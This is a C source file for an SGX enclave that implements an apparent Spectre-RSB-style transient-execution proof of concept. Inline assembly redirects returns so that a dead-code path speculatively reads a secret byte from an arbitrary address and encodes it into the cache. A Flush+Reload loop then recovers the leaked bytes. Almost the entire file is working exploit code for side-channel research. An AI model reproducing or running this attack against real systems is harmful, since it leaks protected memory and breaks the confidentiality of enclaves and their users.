#include <stdarg.h>
#include <stdio.h>      /* vsnprintf */
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

#include "Enclave.h"
#include "Enclave_t.h"  /* print_string */

#include "libcache/cacheutils.h"

#define enclave_printf       printf

//#define DEBUG_PRINT
//#define TESTING
#define DATA "__________________"
#define SECRET "INACCESSIBLESECRET"

int idx;
char* secret_data;

int printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
    return 0;
}


__attribute__((naked)) void slow_return(void* target){
  asm volatile (
    "1:\n\t"
    "pop %%rax\n\t"
    "cmp %[target], (%%rsp)\n\t"
    "jne 1b\n\t"
    "mov %[target], (%%rsp)"
    :
    : [target] "r" (target)
    : "rax", "memory"
  );

  asm volatile (
    "mov $2147476866, %%rcx\n\t"
    "mov $1792388078, %%rax\n\t"
    "mov $1983325987, %%rdx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "div %%ecx\n\t"
    "sub $512, %%rdx\n\t"
    "add %%rdx, (%%rsp)\n\t"
    "ret\n\t"
    :
    :
    : "rax", "rcx", "rdx", "memory"
  );

  return;
}

__attribute__((naked)) void speculate(){
  register void* arg asm("rdi");  // bind C variable to rdi

    asm volatile (
        ".intel_syntax noprefix\n\t"
        "mov %0, [rsp]\n\t"
        ".att_syntax\n\t"
        : "=r" (arg)
    );

  // Will return directly in callee of speculate
  slow_return(arg);
   
  // --- dead code ---
  // access and cache encode here
  cache_encode(secret_data[idx]);

  //printf("Dead code, should not be printed!\n");

  asm volatile ("ret\n\t":::);
}

int __attribute__ ((noinline)) call_start() {
  // slow_return will return directly here
  speculate();
  return 1;
}

char * create_secret() {
  // allocate secret
  char* secret = (char*)malloc(sizeof(char) * 128);

  if(secret == NULL) {
    enclave_printf("allocation of secret failed\n");
  }
  memcpy(secret, SECRET, sizeof(SECRET));

  return secret;
}

void set_secret(char* secret){
  memcpy(secret, SECRET, sizeof(SECRET));
  secret[sizeof(SECRET)] = '0';
}

char * create_public() {
    char* public_data = (char*)malloc(sizeof(DATA)+1);

    if(public_data == NULL) {
        enclave_printf("allocation of public failed\n");
    }

    memcpy(public_data, DATA, sizeof(DATA));

    return public_data;
}

uint64_t ecall_attack(uint64_t addr){
    pagesize = 4096;
    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();

#ifdef DEBUG_PRINT
    enclave_printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
#endif

    char *_mem = (char*)malloc(pagesize * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
    memset(mem, 0, pagesize * 256);

#ifdef TESTING 
        secret_data = create_secret(); 
#else
        secret_data = (char*)addr;
#endif

#ifdef DEBUG_PRINT
    enclave_printf("Secret %p\n", secret_data);
#endif

    flush_shared_memory();

    // nothing leaked so far
    char leaked[sizeof(SECRET)];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;
    
    idx = 0;
    int score = 0;
    int c = 0;

#ifdef TESTING
    #define MAXITER 10000
#else
    #define MAXITER 100000
#endif

    while (1 && c != MAXITER) {
        c++;
        
        call_start();

        // Recover data from covert channel
        cache_decode_pretty(leaked, idx);

        if (leaked[idx] == SECRET[idx]){
            score++;
        }
        leaked[idx] = ' ';

        // for every byte in the string
        idx = (idx + 1) % (sizeof(SECRET) - 1);
    }

    enclave_printf("%d, %d", c, score);
    if (score > 0){
        enclave_printf(" <--\n");
    }else{
        enclave_printf("\n");
    }
    return (uint64_t)SGX_SUCCESS;
}
